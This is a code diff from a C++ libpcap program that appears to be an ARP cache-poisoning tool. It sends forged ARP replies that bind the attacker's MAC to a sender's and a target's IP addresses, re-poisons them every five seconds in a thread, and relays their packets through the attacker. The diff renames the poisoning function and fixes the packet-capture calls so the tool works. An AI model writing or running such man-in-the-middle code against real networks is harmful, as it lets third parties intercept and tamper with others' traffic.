@@ -52,7 +52,7 @@ bool get_mac_address(const string& if_name, uint8_t* mac_addr_buf) {
     return true;
 }
 
-void infect_arp(pcap_t* handle, const Ip attacker_ip, const Mac attacker_mac, const Ip sender_ip, Mac& sender_mac) {
+void infect_with_arp(pcap_t* handle, const Ip attacker_ip, const Mac attacker_mac, const Ip sender_ip, Mac& sender_mac) {
     EthArpPacket packet;
 
     packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
@@ -99,13 +99,13 @@ void arp_infect(int argc, char *argv[], int i, const Mac& attacker_mac) {
     while (true) {
         sleep(5); 
 
-        pcap_t* handle = pcap_live(dev, BUFSIZ, 1, 1000, nullptr);
+        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, nullptr);
         if (handle == nullptr) {
             return;
         }
 
         Mac sender_mac;
-        infect_arp(handle, Ip(target_ip_str), attacker_mac, Ip(sender_ip_str), sender_mac);
+        infect_with_arp(handle, Ip(target_ip_str), attacker_mac, Ip(sender_ip_str), sender_mac);
 
         EthArpPacket packet;
         packet.eth_.dmac_ = sender_mac;
@@ -160,7 +160,7 @@ int main(int argc, char* argv[]) {
     char* dev = argv[1];
     string dev_str = string(dev);
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_live(dev, BUFSIZ, 1, 1, errbuf);
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
     if (handle == nullptr) {
         return -1;
     }
@@ -176,8 +176,8 @@ int main(int argc, char* argv[]) {
         Ip target_ip = Ip(argv[i + 1]);
 
         Mac sender_mac, target_mac;
-        infect_arp(handle, target_ip, Mac(attacker_mac), sender_ip, sender_mac);
-        infect_arp(handle, sender_ip, Mac(attacker_mac), target_ip, target_mac);
+        infect_with_arp(handle, target_ip, Mac(attacker_mac), sender_ip, sender_mac);
+        infect_with_arp(handle, sender_ip, Mac(attacker_mac), target_ip, target_mac);
 
         threads.push_back(thread(arp_infect, argc, argv, i / 2, Mac(attacker_mac)));
         threads.push_back(thread(relay_packets, handle, sender_ip, target_ip, sender_mac, Mac(attacker_mac), target_mac));
